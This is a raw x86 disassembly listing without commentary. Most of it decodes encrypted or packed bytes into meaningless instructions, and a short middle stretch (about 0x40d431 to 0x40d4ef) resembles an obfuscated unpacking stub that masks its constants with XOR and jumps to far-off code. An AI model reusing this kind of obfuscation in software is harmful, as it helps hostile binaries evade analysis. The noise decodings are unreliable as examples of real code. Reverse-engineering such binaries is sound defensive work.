  40ce50:	or     DWORD PTR [ecx+0x720d7ccf],ecx
  40ce56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce57:	fnsave [ebx-0x2dd85671]
  40ce5d:	inc    esi
  40ce5e:	sbb    al,dh
  40ce60:	inc    edi
  40ce61:	cs mov ecx,0x9527580d
  40ce67:	leave  
  40ce68:	(bad)  
  40ce69:	dec    edx
  40ce6a:	jle    0x40ce9f
  40ce6c:	xor    esi,DWORD PTR [edx-0x41]
  40ce6f:	mov    bh,0x97
  40ce71:	jno    0x40cedb
  40ce73:	popf   
  40ce74:	cmp    eax,0xb423b5f8
  40ce79:	push   ss
  40ce7a:	js     0x40cebc
  40ce7c:	sbb    BYTE PTR [eax+0x9],dh
  40ce7f:	ss clc 
  40ce81:	push   eax
  40ce82:	pop    eax
  40ce83:	pushf  
  40ce84:	dec    esi
  40ce85:	mov    edx,0x1bb72458
  40ce8a:	xor    DWORD PTR [edi+0x6a426b56],eax
  40ce90:	xor    dh,BYTE PTR [edi]
  40ce92:	test   eax,0x432aea1b
  40ce97:	int    0x7b
  40ce99:	cmp    DWORD PTR [ecx-0x75820e1c],0x6b
  40cea0:	pop    edi
  40cea1:	xchg   edx,eax
  40cea2:	fwait
  40cea3:	xor    DWORD PTR [eax],edx
  40cea5:	dec    esi
  40cea6:	inc    BYTE PTR [ebx]
  40cea8:	adc    ah,BYTE PTR [edi+0x5fddf875]
  40ceae:	and    eax,0x97fa4163
  40ceb3:	mov    edi,0xfb6bec6a
  40ceb8:	dec    esp
  40ceb9:	outs   dx,BYTE PTR ds:[esi]
  40ceba:	or     DWORD PTR [ecx-0x5d],0xd2093d1a
  40cec1:	jne    0x40ceaa
  40cec3:	jp     0x40cf0d
  40cec5:	ret    0x7a90
  40cec8:	js     0x40cef7
  40ceca:	imul   ebp
  40cecc:	xor    eax,0x887bcd5a
  40ced1:	sbb    al,0x38
  40ced3:	inc    eax
  40ced4:	mov    ds:0xb0d109e6,eax
  40ced9:	dec    edi
  40ceda:	xchg   esp,eax
  40cedb:	push   es
  40cedc:	inc    edx
  40cedd:	mov    bh,0xfa
  40cedf:	sub    BYTE PTR [esi],ah
  40cee1:	sbb    eax,0xa357d593
  40cee6:	and    al,0x9f
  40cee8:	inc    ebx
  40cee9:	(bad)  
  40ceea:	neg    bh
  40ceec:	inc    ebp
  40ceed:	ja     0x40cf4f
  40ceef:	dec    eax
  40cef0:	repz div al
  40cef3:	shl    ebx,0x28
  40cef6:	xchg   esi,eax
  40cef7:	cmp    ebx,DWORD PTR [edx-0x31010b4d]
  40cefd:	sbb    dl,BYTE PTR [esi+0x32]
  40cf00:	fcomp  DWORD PTR [ecx-0x508cdef5]
  40cf06:	add    eax,DWORD PTR [ecx-0x3d]
  40cf09:	push   es
  40cf0a:	xor    BYTE PTR [ebx],ch
  40cf0c:	lds    ecx,FWORD PTR [edx-0x6e405aab]
  40cf12:	fwait
  40cf13:	sub    ah,BYTE PTR [eax+0x6a1117c6]
  40cf19:	xor    al,0x50
  40cf1b:	dec    ebx
  40cf1c:	ffreep st(5)
  40cf1e:	adc    DWORD PTR [edx+0x49],edi
  40cf21:	scas   al,BYTE PTR es:[edi]
  40cf22:	sbb    al,0xd
  40cf24:	loopne 0x40cf51
  40cf26:	or     DWORD PTR [ecx+0xca2e80],0x7aaafacf
  40cf30:	sbb    DWORD PTR [eax-0x29],0xc2d5fdff
  40cf37:	gs loope 0x40cf25
  40cf3a:	rcr    DWORD PTR [edx+edi*1+0x9],cl
  40cf3e:	push   0x16
  40cf40:	icebp  
  40cf41:	stc    
  40cf42:	push   0xf327f137
  40cf47:	sub    DWORD PTR ds:0x814a41ad,esi
  40cf4d:	inc    ecx
  40cf4e:	mov    edi,0x1964426b
  40cf53:	sub    dh,BYTE PTR [edx-0x7eb1fba1]
  40cf59:	cmp    al,0x9d
  40cf5b:	outs   dx,BYTE PTR ds:[esi]
  40cf5c:	jge    0x40cf92
  40cf5e:	in     eax,0x54
  40cf60:	rcl    DWORD PTR [ecx],cl
  40cf62:	mov    ebp,0x77da952e
  40cf67:	sbb    eax,DWORD PTR [ecx-0x80573c1]
  40cf6d:	outs   dx,BYTE PTR ds:[esi]
  40cf6e:	rcr    BYTE PTR [edx+esi*4-0x38],cl
  40cf72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf73:	js     0x40cf45
  40cf75:	mov    esi,DWORD PTR [ecx+0x7c40343e]
  40cf7b:	mov    eax,0x250e91a0
  40cf80:	xor    eax,0x8899a51c
  40cf85:	xchg   edi,eax
  40cf86:	jo     0x40cfbf
  40cf88:	or     DWORD PTR [ecx+eax*1-0x16],esi
  40cf8c:	push   eax
  40cf8d:	jnp    0x40cfde
  40cf8f:	sub    edi,DWORD PTR [esi+0xd3fcb1b]
  40cf95:	sbb    BYTE PTR [ecx+0x30],bh
  40cf98:	adc    BYTE PTR [ecx-0x573ddaa4],bh
  40cf9e:	clc    
  40cf9f:	imul   edi,eax,0xe5c8a4a5
  40cfa5:	mov    gs,esi
  40cfa7:	sar    DWORD PTR [edx+0x69],0x9b
  40cfab:	sahf   
  40cfac:	sub    BYTE PTR [edi+0x1c8774da],ah
  40cfb2:	adc    eax,0xb3e56747
  40cfb7:	inc    eax
  40cfb8:	mov    ch,0x45
  40cfba:	(bad)  
  40cfbb:	adc    esp,DWORD PTR [eax-0x5a08560b]
  40cfc1:	les    edx,FWORD PTR [eax-0x3]
  40cfc4:	dec    edx
  40cfc5:	cmp    al,0x2c
  40cfc7:	xor    DWORD PTR [ecx-0x70],edi
  40cfca:	xor    al,0x28
  40cfcc:	cmp    al,0x42
  40cfce:	loopne 0x40cf77
  40cfd0:	js     0x40cf6a
  40cfd2:	push   esp
  40cfd3:	sub    eax,DWORD PTR [eax-0x5a095c27]
  40cfd9:	pusha  
  40cfda:	adc    BYTE PTR [edi+0x627fd06d],bh
  40cfe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfe1:	jge    0x40cfff
  40cfe3:	inc    edi
  40cfe4:	mov    eax,0x93914d60
  40cfe9:	jbe    0x40cf70
  40cfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfec:	ds cld 
  40cfee:	add    edi,eax
  40cff0:	daa    
  40cff1:	push   ecx
  40cff2:	cs or  ebp,edx
  40cff5:	test   al,0x8e
  40cff7:	cmp    esp,ecx
  40cff9:	sub    DWORD PTR [edx],ebp
  40cffb:	test   BYTE PTR [ebp-0x307f59ef],ch
  40d001:	(bad)  
  40d002:	pushf  
  40d003:	or     DWORD PTR [edx-0x730d14f2],esp
  40d009:	cmp    dh,BYTE PTR [ebx+0x16fb1fb7]
  40d00f:	add    edi,DWORD PTR [esi+ebp*2-0x7f]
  40d013:	or     al,0xb2
  40d016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d017:	(bad)  
  40d018:	into   
  40d019:	stos   DWORD PTR es:[edi],eax
  40d01a:	xchg   esp,eax
  40d01b:	jne    0x40d04f
  40d01d:	pop    es
  40d01e:	dec    esi
  40d01f:	lea    edi,[ebx-0x61]
  40d022:	jbe    0x40d07f
  40d024:	mov    DWORD PTR [ecx+0x13],ebx
  40d027:	outs   dx,DWORD PTR ds:[esi]
  40d028:	mov    ds,WORD PTR [ebx+0x2230e500]
  40d02e:	std    
  40d02f:	xor    BYTE PTR [ebp+0x5],cl
  40d032:	shl    al,cl
  40d034:	ins    BYTE PTR es:[edi],dx
  40d035:	outs   dx,BYTE PTR ds:[esi]
  40d036:	out    0x74,al
  40d038:	dec    ebx
  40d039:	xchg   BYTE PTR [ecx+0x5041f263],bh
  40d03f:	jle    0x40cfca
  40d041:	retf   
  40d042:	rcl    BYTE PTR [edx-0x38f1f46f],1
  40d048:	repz jnp 0x40cff5
  40d04b:	sbb    al,BYTE PTR [edx-0x3dd2a775]
  40d051:	xchg   edi,eax
  40d052:	pop    edx
  40d053:	cwde   
  40d054:	push   eax
  40d055:	pop    esi
  40d056:	adc    dh,BYTE PTR [ebp-0x44]
  40d059:	mov    dl,0x1a
  40d05b:	setl   BYTE PTR [edx+0x67]
  40d05f:	sbb    bl,BYTE PTR [ebx]
  40d061:	sbb    eax,0x951c9b7d
  40d066:	hlt    
  40d067:	ins    BYTE PTR es:[edi],dx
  40d068:	push   edx
  40d069:	cmp    ah,bh
  40d06b:	lahf   
  40d06c:	or     cl,BYTE PTR [eax+0x7ce555f4]
  40d072:	cmp    DWORD PTR [edi+ecx*1+0x6218517d],esi
  40d079:	xchg   ebx,eax
  40d07a:	cwde   
  40d07b:	fs pushf 
  40d07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d07e:	lds    eax,FWORD PTR [edx+0x4e60434f]
  40d084:	scas   al,BYTE PTR es:[edi]
  40d085:	xchg   ecx,eax
  40d086:	sbb    eax,DWORD PTR [eax-0x6868eb12]
  40d08c:	mov    esi,0x6b0deb62
  40d091:	dec    ecx
  40d092:	(bad)  
  40d093:	repnz dec ebp
  40d095:	cwde   
  40d096:	lods   eax,DWORD PTR ds:[esi]
  40d097:	frstor [ecx-0x41]
  40d09a:	lds    ecx,FWORD PTR [edi+0x10]
  40d09d:	jo     0x40d028
  40d09f:	push   esi
  40d0a0:	imul   edx,DWORD PTR [esi+0x44],0xffffffa2
  40d0a4:	push   0xffffffbf
  40d0a6:	imul   eax,ebx,0xb8247aa6
  40d0ac:	xchg   esp,eax
  40d0ad:	ret    
  40d0ae:	mov    esp,DWORD PTR [edx]
  40d0b0:	mov    esi,0xcabd84b4
  40d0b5:	rcl    al,0x34
  40d0b8:	mov    ebp,0x88e3065
  40d0bd:	stos   DWORD PTR es:[edi],eax
  40d0be:	dec    eax
  40d0bf:	frstor [edi]
  40d0c1:	or     dl,BYTE PTR [eax-0x3a]
  40d0c4:	test   eax,0x2511c277
  40d0c9:	mov    ebx,0x67990ae1
  40d0ce:	pop    edi
  40d0cf:	jne    0x40d115
  40d0d1:	fisub  WORD PTR [ebp-0x55055476]
  40d0d7:	mov    ebx,0xd778420
  40d0dc:	pop    ebx
  40d0dd:	dec    ebx
  40d0de:	addr16 daa 
  40d0e0:	add    esi,DWORD PTR [edx-0x31100441]
  40d0e6:	ror    BYTE PTR [esi-0x2f],cl
  40d0e9:	iret   
  40d0ea:	xchg   BYTE PTR [edi-0x41],dl
  40d0ed:	sbb    ebp,edx
  40d0ef:	xor    DWORD PTR [edx-0x50b2312],eax
  40d0f5:	ins    BYTE PTR es:[edi],dx
  40d0f6:	sub    BYTE PTR ds:0xcb704453,al
  40d0fc:	aaa    
  40d0fd:	pop    es
  40d0fe:	cdq    
  40d0ff:	cmp    ebx,DWORD PTR [esi+ecx*2-0x48]
  40d103:	pop    ebp
  40d104:	jg     0x40d0e6
  40d106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d107:	add    al,BYTE PTR [esi-0x7549866a]
  40d10d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d10e:	xchg   DWORD PTR [esi],eax
  40d110:	icebp  
  40d111:	fild   WORD PTR [edx]
  40d113:	or     dh,al
  40d115:	mov    dh,0x4e
  40d117:	cmp    al,0x9a
  40d119:	shr    DWORD PTR [eax+0x4f],cl
  40d11c:	jecxz  0x40d0ef
  40d11e:	test   eax,0x6e927e02
  40d123:	or     eax,DWORD PTR [ebx+0x13]
  40d126:	adc    DWORD PTR [ecx-0x1b7ec09e],ebx
  40d12c:	xchg   ecx,eax
  40d12d:	jno    0x40d0f2
  40d12f:	repnz push 0xe02cc3
  40d135:	and    ebx,DWORD PTR [ecx]
  40d137:	inc    edi
  40d138:	cmp    BYTE PTR [edx],bh
  40d13a:	pop    ds
  40d13b:	and    edi,esp
  40d13d:	add    ebp,DWORD PTR [edi+0x67da1c7a]
  40d143:	repz into 
  40d145:	(bad)  
  40d146:	pop    eax
  40d147:	test   BYTE PTR ds:0x472e48a1,dl
  40d14d:	stc    
  40d14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d14f:	(bad)  
  40d150:	sti    
  40d151:	ins    BYTE PTR es:[di],dx
  40d153:	test   BYTE PTR [eax-0x4d],0x39
  40d157:	stc    
  40d158:	call   0xfa4cee45
  40d15d:	in     al,dx
  40d15e:	mov    ebx,0xb609685a
  40d163:	nop
  40d164:	retf   0x54a7
  40d167:	(bad)  
  40d168:	mov    ds:0x1b7c3f2a,al
  40d16d:	or     bl,BYTE PTR [edx-0xd]
  40d170:	enter  0xc3c8,0x54
  40d174:	stos   DWORD PTR es:[edi],eax
  40d175:	xor    eax,0x2aed7da4
  40d17a:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40d17c:	loop   0x40d1ee
  40d17e:	mov    cl,0x62
  40d180:	add    eax,0x9a26463b
  40d185:	mov    ds:0x80ecc4b,eax
  40d18a:	ds inc eax
  40d18c:	shr    DWORD PTR [edx-0x2e],0x29
  40d190:	int3   
  40d191:	mov    edi,0xeaa0f99f
  40d196:	jns    0x40d159
  40d198:	js     0x40d145
  40d19a:	xor    ah,dl
  40d19c:	cli    
  40d19d:	js     0x40d164
  40d19f:	repz adc eax,0x5845020d
  40d1a5:	test   DWORD PTR [edi-0x41],0x7b9b983e
  40d1ac:	lods   eax,DWORD PTR ds:[esi]
  40d1ad:	push   ds
  40d1ae:	hlt    
  40d1af:	(bad)  
  40d1b0:	out    dx,al
  40d1b1:	mov    eax,ds:0xbbf42efd
  40d1b6:	ret    0xf86e
  40d1b9:	data16 outs dx,BYTE PTR ds:[esi]
  40d1bb:	pop    edi
  40d1bc:	clc    
  40d1bd:	mov    bl,0x53
  40d1bf:	mov    ds:0xe2e7afac,eax
  40d1c4:	pushf  
  40d1c5:	push   ebp
  40d1c6:	ror    BYTE PTR [eax-0x309d83e5],1
  40d1cc:	imul   edx,DWORD PTR [eax+ebx*4],0xffffff92
  40d1d0:	in     al,0xdc
  40d1d2:	hlt    
  40d1d3:	daa    
  40d1d4:	addr16 mov ds:0x4523,al
  40d1d8:	rol    DWORD PTR [edi-0x77],1
  40d1db:	rol    DWORD PTR [ebp-0x2fe711dc],0x88
  40d1e2:	je     0x40d1cd
  40d1e4:	sbb    cl,BYTE PTR [ecx+0x6517a82f]
  40d1ea:	sar    DWORD PTR [eax-0x6bb70326],1
  40d1f0:	push   0xeb939f3b
  40d1f5:	lods   eax,DWORD PTR ds:[esi]
  40d1f6:	sbb    al,BYTE PTR [ecx-0x63ce74fa]
  40d1fc:	aam    0x90
  40d1fe:	inc    esp
  40d1ff:	call   0x7d89:0x6bfde458
  40d206:	jle    0x40d21c
  40d208:	ds leave 
  40d20a:	and    al,0xec
  40d20c:	and    ebp,esi
  40d20e:	pushf  
  40d20f:	lock cmp ebx,ebp
  40d212:	jbe    0x40d25f
  40d214:	popf   
  40d215:	mov    ecx,0xfc98b7cf
  40d21a:	call   0x40f6a3c2
  40d21f:	adc    BYTE PTR [esi-0x1de67e62],0x33
  40d226:	idiv   dh
  40d228:	jmp    0x39d06e28
  40d22d:	xor    BYTE PTR [ebx-0x8feb1e9],0x22
  40d234:	cld    
  40d235:	inc    edx
  40d236:	cwde   
  40d237:	cld    
  40d238:	pop    esp
  40d239:	jne    0x40d28c
  40d23b:	in     al,0x6a
  40d23d:	ins    BYTE PTR es:[edi],dx
  40d23e:	pop    ss
  40d23f:	ret    0xac18
  40d242:	js     0x40d232
  40d244:	mov    bh,0xb3
  40d246:	pop    ebp
  40d247:	xchg   edi,eax
  40d248:	daa    
  40d249:	mov    ecx,0xdf3a3b9e
  40d24e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d24f:	push   ss
  40d250:	cli    
  40d251:	pop    edx
  40d252:	hlt    
  40d253:	inc    ebp
  40d254:	lahf   
  40d255:	mov    ds:0xd6428d53,al
  40d25a:	das    
  40d25b:	outs   dx,BYTE PTR ds:[esi]
  40d25c:	push   ss
  40d25d:	es (bad) 
  40d260:	(bad)
  40d263:	add    eax,0x703c8cc7
  40d268:	inc    ebx
  40d269:	(bad)  
  40d26a:	jle    0x40d22b
  40d26c:	sbb    DWORD PTR [eax+0x3a622709],ebx
  40d272:	or     eax,0x8e44a191
  40d277:	les    eax,FWORD PTR [eax-0x3d]
  40d27a:	inc    esp
  40d27b:	ss nop
  40d27d:	addr16 jge 0x40d2d0
  40d280:	(bad)
  40d284:	inc    esi
  40d285:	les    esp,FWORD PTR [ebp+0x43]
  40d288:	xor    ch,bh
  40d28a:	pop    edi
  40d28b:	sub    bl,BYTE PTR [eax]
  40d28d:	ret    
  40d28e:	(bad)  
  40d28f:	cmp    eax,0xe01a1db1
  40d294:	lock fsubr st,st(0)
  40d297:	outs   dx,DWORD PTR ds:[esi]
  40d298:	fdiv   DWORD PTR [esi-0x36d6213]
  40d29e:	lods   eax,DWORD PTR ds:[esi]
  40d29f:	jne    0x40d258
  40d2a1:	and    DWORD PTR [edi],0xf4cb2cb6
  40d2a7:	mov    dl,0x1e
  40d2a9:	dec    ecx
  40d2aa:	inc    ebx
  40d2ab:	xchg   ebp,eax
  40d2ac:	retf   
  40d2ad:	sti    
  40d2ae:	(bad)  
  40d2af:	mov    dl,0x8
  40d2b1:	rcl    DWORD PTR [edi],cl
  40d2b3:	jnp    0x40d329
  40d2b5:	(bad)  [edi-0x301e1b37]
  40d2bb:	out    0xfb,eax
  40d2bd:	out    0xf0,eax
  40d2bf:	and    al,0x56
  40d2c1:	mov    edx,DWORD PTR [ebx-0x7ce8fa5e]
  40d2c7:	int3   
  40d2c8:	and    dh,bh
  40d2ca:	mov    edx,0x71fd3f0c
  40d2cf:	adc    eax,DWORD PTR [bp+si+0x4392]
  40d2d4:	or     eax,0xda9cce36
  40d2d9:	mov    ch,0xb
  40d2db:	and    eax,edx
  40d2dd:	push   ecx
  40d2de:	sbb    al,0xf4
  40d2e0:	jne    0x40d29d
  40d2e2:	push   ss
  40d2e3:	das    
  40d2e4:	inc    ecx
  40d2e5:	scas   al,BYTE PTR es:[edi]
  40d2e6:	xor    BYTE PTR [edi-0x45e4b4d3],cl
  40d2ec:	arpl   WORD PTR [edx+0x4c],bp
  40d2ef:	(bad)  
  40d2f0:	mov    WORD PTR [ebx],?
  40d2f2:	jb     0x40d2fe
  40d2f4:	push   esi
  40d2f5:	cmp    DWORD PTR [ebx-0x41],esp
  40d2f8:	clc    
  40d2f9:	adc    al,0x62
  40d2fb:	aaa    
  40d2fc:	retf   
  40d2fd:	dec    ecx
  40d2fe:	push   0x6b
  40d300:	push   ss
  40d301:	je     0x40d308
  40d303:	mov    al,ds:0x409d6227
  40d308:	add    DWORD PTR [esi-0x4f],ebx
  40d30b:	test   ch,0x89
  40d30e:	hlt    
  40d30f:	and    BYTE PTR [eax-0x2b4b5c93],bh
  40d315:	add    al,0xcf
  40d317:	pop    ebp
  40d318:	ror    BYTE PTR [edi-0x67b389fa],cl
  40d31e:	aaa    
  40d31f:	test   bl,al
  40d321:	cmp    al,0xac
  40d323:	add    ebp,DWORD PTR [ebx-0x10]
  40d326:	pop    edi
  40d327:	aaa    
  40d328:	(bad)  
  40d329:	in     eax,dx
  40d32a:	in     eax,0x3d
  40d32c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d32d:	lahf   
  40d32e:	in     eax,dx
  40d32f:	dec    esp
  40d330:	lods   al,BYTE PTR ds:[esi]
  40d331:	adc    al,BYTE PTR [edi+edi*8-0x2405fc33]
  40d338:	les    ebp,FWORD PTR [edx]
  40d33a:	aam    0xd
  40d33c:	pushf  
  40d33d:	xor    al,0xe8
  40d33f:	lahf   
  40d340:	adc    al,0x69
  40d342:	fisub  DWORD PTR [ebp-0x6ac4edd]
  40d348:	cli    
  40d349:	test   BYTE PTR [edx-0x54a70142],ch
  40d34f:	mov    cl,BYTE PTR [ebx-0x13]
  40d352:	add    BYTE PTR [ebx+0x1efe0588],0xeb
  40d359:	mov    esp,0x2f3c7683
  40d35e:	lock mov bh,0x26
  40d361:	jno    0x40d338
  40d363:	fisub  DWORD PTR [eax]
  40d365:	pop    DWORD PTR [ebx-0xb382e88]
  40d36b:	xchg   DWORD PTR [ebx-0x59],ecx
  40d36e:	das    
  40d36f:	sti    
  40d370:	fldenv [edi]
  40d372:	out    dx,al
  40d373:	inc    esp
  40d374:	idiv   BYTE PTR [eax]
  40d376:	mov    ah,0x53
  40d378:	retf   0xd0ee
  40d37b:	add    bl,BYTE PTR [esi+0x75c2bb8]
  40d381:	xor    BYTE PTR [edx],ch
  40d383:	es dec ecx
  40d385:	loope  0x40d3dc
  40d387:	int    0xed
  40d389:	cmp    al,0x2a
  40d38b:	dec    ecx
  40d38c:	mov    ecx,0x4d4d7ef7
  40d391:	imul   esi,esp,0xffffffef
  40d394:	xchg   ebp,eax
  40d395:	daa    
  40d396:	(bad)  
  40d397:	mov    ch,0xcf
  40d399:	cmp    al,0x31
  40d39b:	cs dec ebx
  40d39d:	ficomp WORD PTR [edi-0x53e34e03]
  40d3a3:	test   al,0x8d
  40d3a5:	push   es
  40d3a6:	loope  0x40d372
  40d3a8:	xor    al,BYTE PTR [edi+edi*1+0x338eaebf]
  40d3af:	jmp    0xab9c:0x280433f3
  40d3b6:	and    bl,ah
  40d3b8:	adc    DWORD PTR [edx+0x65],edx
  40d3bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3bc:	ja     0x40d388
  40d3be:	cli    
  40d3bf:	ror    DWORD PTR [esi+0x3d],0x67
  40d3c3:	xchg   esp,eax
  40d3c4:	loopne 0x40d36d
  40d3c6:	push   ebx
  40d3c7:	and    ch,BYTE PTR [edi-0x15]
  40d3ca:	test   BYTE PTR [ebx+0x49],bh
  40d3cd:	sbb    eax,0x5e9cac62
  40d3d2:	sub    DWORD PTR [edi+0x7c],eax
  40d3d5:	lock test eax,0x39ded141
  40d3db:	lahf   
  40d3dc:	sti    
  40d3dd:	dec    ebp
  40d3de:	out    0xe9,eax
  40d3e0:	ret    0xffd5
  40d3e3:	enter  0x534e,0x5
  40d3e7:	in     al,dx
  40d3e8:	jg     0x40d377
  40d3ea:	and    edx,DWORD PTR [esi]
  40d3ec:	jb     0x40d46c
  40d3ee:	in     al,dx
  40d3ef:	test   al,0x69
  40d3f1:	sti    
  40d3f2:	arpl   WORD PTR [ebx+0x504556cf],di
  40d3f8:	outs   dx,DWORD PTR ds:[esi]
  40d3f9:	inc    esi
  40d3fa:	jne    0x40d3bd
  40d3fc:	das    
  40d3fd:	sub    ah,dh
  40d3ff:	push   ebp
  40d400:	jae    0x40d44a
  40d402:	xchg   ebp,eax
  40d403:	jno    0x40d3a6
  40d405:	lock adc eax,0xa45c7e87
  40d40b:	fadd   st(7),st
  40d40d:	dec    eax
  40d40e:	inc    esi
  40d40f:	jmp    0x6ced:0xb5e4f038
  40d416:	dec    edx
  40d417:	daa    
  40d418:	sbb    DWORD PTR [ebx+0x58],ebx
  40d41b:	call   0xc0af:0xed083c0a
  40d422:	jmp    0x40d3aa
  40d424:	std    
  40d425:	ror    DWORD PTR [ecx+0x4c],1
  40d428:	in     eax,0xf
  40d42a:	scas   eax,DWORD PTR es:[edi]
  40d42b:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40d431:	mov    ecx,DWORD PTR [ebp+0x8]
  40d434:	lea    ecx,[edx+ecx*1+0x3272db]
  40d43b:	cmp    ecx,eax
  40d43d:	je     0x40d4b4
  40d443:	mov    edi,DWORD PTR [ebp-0x14]
  40d446:	mov    eax,DWORD PTR [ebp+0x8]
  40d449:	mov    edx,DWORD PTR [ebp+0x14]
  40d44c:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d450:	mov    ecx,0x7510893
  40d455:	xor    edx,edx
  40d457:	xor    edi,ecx
  40d459:	mov    esi,0x3272db
  40d45e:	add    edi,esi
  40d460:	div    edi
  40d462:	mov    edx,DWORD PTR [ebp-0x4]
  40d465:	xor    edx,ecx
  40d467:	lea    eax,[edx+eax*1+0x3272db]
  40d46e:	mov    edx,DWORD PTR [ebp+0x8]
  40d471:	mov    edi,DWORD PTR [ebp-0x20]
  40d474:	mov    DWORD PTR [edi+edx*4],eax
  40d477:	mov    eax,DWORD PTR [ebp-0x14]
  40d47a:	mov    edx,DWORD PTR [ebp+0x8]
  40d47d:	xor    eax,ecx
  40d47f:	lea    eax,[eax+edx*1+0x3272db]
  40d486:	mov    DWORD PTR [ebp+0x8],eax
  40d489:	mov    eax,DWORD PTR [ebp-0x14]
  40d48c:	mov    edx,DWORD PTR [ebp+0x14]
  40d48f:	xor    eax,ecx
  40d491:	add    eax,esi
  40d493:	imul   eax,DWORD PTR [edx]
  40d496:	mov    edx,DWORD PTR [ebp-0x4]
  40d499:	xor    edx,ecx
  40d49b:	mov    ecx,DWORD PTR [ebp+0x8]
  40d49e:	lea    ecx,[edx+ecx*1+0x3272db]
  40d4a5:	cmp    ecx,eax
  40d4a7:	jne    0x40d443
  40d4ad:	mov    eax,esi
  40d4af:	jmp    0x40d4b9
  40d4b4:	mov    eax,0x3272db
  40d4b9:	mov    ebx,0x7510893
  40d4be:	mov    ecx,DWORD PTR [ebp-0x4]
  40d4c1:	xor    ecx,ebx
  40d4c3:	add    ecx,eax
  40d4c5:	mov    DWORD PTR [ebp-0xc],ecx
  40d4c8:	mov    ebx,0x65655
  40d4cd:	add    ebx,0x3234
  40d4d3:	xchg   ebx,esi
  40d4d5:	xor    ebx,ebx
  40d4d7:	push   esi
  40d4d8:	mov    esi,ebx
  40d4da:	pop    ebx
  40d4db:	mov    edx,esi
  40d4dd:	add    ebx,0x1002
  40d4e3:	lea    eax,[ebp-0x10]
  40d4e6:	add    edx,eax
  40d4e8:	add    edx,0x5
  40d4eb:	push   edx
  40d4ec:	inc    esi
  40d4ed:	pop    ecx
  40d4ee:	dec    ecx
  40d4ef:	jmp    0x40f854
  40d4f4:	jl     0x40d532
  40d4f6:	pop    es
  40d4f7:	call   0xe49cb803
  40d4fc:	and    BYTE PTR [edi-0x78deb123],0xba
  40d503:	jnp    0x40d4a5
  40d505:	shl    BYTE PTR [edx+0x62],cl
  40d508:	cmp    bl,BYTE PTR [edi+0x62]
  40d50b:	bound  edi,QWORD PTR [edx-0x5cf45133]
  40d511:	ins    BYTE PTR es:[edi],dx
  40d512:	push   eax
  40d513:	cmc    
  40d514:	jmp    0x40d550
  40d516:	xchg   edi,eax
  40d517:	mov    ch,0x12
  40d519:	mov    al,ds:0x765d9cb2
  40d51e:	ins    DWORD PTR es:[edi],dx
  40d51f:	add    DWORD PTR [ebp-0x27],ebx
  40d522:	shr    DWORD PTR [esi-0x5b135364],0xc7
  40d529:	repnz ins DWORD PTR es:[edi],dx
  40d52b:	pop    edi
  40d52c:	inc    esp
  40d52d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d52e:	push   0x90613559
  40d533:	push   ebx
  40d534:	popa   
  40d535:	pop    ebx
  40d536:	lea    eax,[ebp+0x1e]
  40d539:	lock cld 
  40d53b:	mov    eax,ds:0xfdac7ddc
  40d540:	pop    ds
  40d541:	fcomip st,st(0)
  40d543:	add    al,0xee
  40d545:	or     edi,DWORD PTR [esi+ecx*1-0x5]
  40d549:	call   0x6cc1:0x55a393cb
  40d550:	mov    al,ds:0x129083fc
  40d555:	inc    esi
  40d556:	xchg   ebp,eax
  40d557:	imul   edx,DWORD PTR [ebx],0xffffffe9
  40d55a:	push   ss
  40d55b:	inc    edi
  40d55c:	aad    0x5f
  40d55e:	adc    BYTE PTR [esi-0x2],bh
  40d561:	pop    ds
  40d562:	and    ch,0x78
  40d565:	(bad)  
  40d566:	das    
  40d567:	test   eax,0x51b49cd1
  40d56c:	ret    
  40d56d:	jae    0x40d509
  40d56f:	pop    esi
  40d570:	sub    bh,BYTE PTR [edi+eiz*1]
  40d573:	push   es
  40d574:	gs jo  0x40d525
  40d577:	push   ss
  40d578:	(bad)  
  40d579:	fcomi  st,st(4)
  40d57b:	sbb    al,0x6f
  40d57d:	test   DWORD PTR [ebx-0x2a],ebp
  40d580:	retf   
  40d581:	mov    BYTE PTR [edi-0x2],0x7e
  40d585:	out    dx,eax
  40d586:	add    ebp,DWORD PTR [ebx+0x35ba6db8]
  40d58c:	das    
  40d58d:	cmp    al,0x7e
  40d58f:	jle    0x40d5e2
  40d591:	xchg   esi,eax
  40d592:	jp     0x40d548
  40d594:	enter  0x7f69,0x70
  40d598:	pop    edi
  40d599:	shr    BYTE PTR ss:[esi+eax*8+0x1c5882bd],0x1a
  40d5a2:	sub    DWORD PTR [edi],edi
  40d5a4:	gs retf 0x1f6e
  40d5a8:	pop    ss
  40d5a9:	loop   0x40d5a8
  40d5ab:	cmp    al,dl
  40d5ad:	ja     0x40d547
  40d5af:	sbb    ebx,esp
  40d5b1:	adc    DWORD PTR [edi],esi
  40d5b3:	jb     0x40d536
  40d5b5:	imul   eax,DWORD PTR [ebp+0x16],0x669d0eb7
  40d5bc:	jbe    0x40d596
  40d5be:	pop    edx
  40d5bf:	sar    BYTE PTR [ebp+edx*2+0x74e98be9],1
  40d5c6:	adc    eax,0x8000af92
  40d5cb:	push   0x48
  40d5cd:	lods   al,BYTE PTR ds:[esi]
  40d5ce:	gs jge 0x40d59a
  40d5d1:	mov    ah,0x6f
  40d5d3:	(bad)  
  40d5d4:	in     eax,dx
  40d5d5:	jle    0x40d577
  40d5d7:	ror    BYTE PTR [edi+0x37],cl
  40d5da:	jb     0x40d5fd
  40d5dc:	inc    DWORD PTR [eax+0x2e]
  40d5df:	push   es
  40d5e0:	jbe    0x40d608
  40d5e2:	or     BYTE PTR [ebx+ebp*8],ch
  40d5e5:	mov    cl,0x51
  40d5e7:	jo     0x40d5a3
  40d5e9:	inc    esp
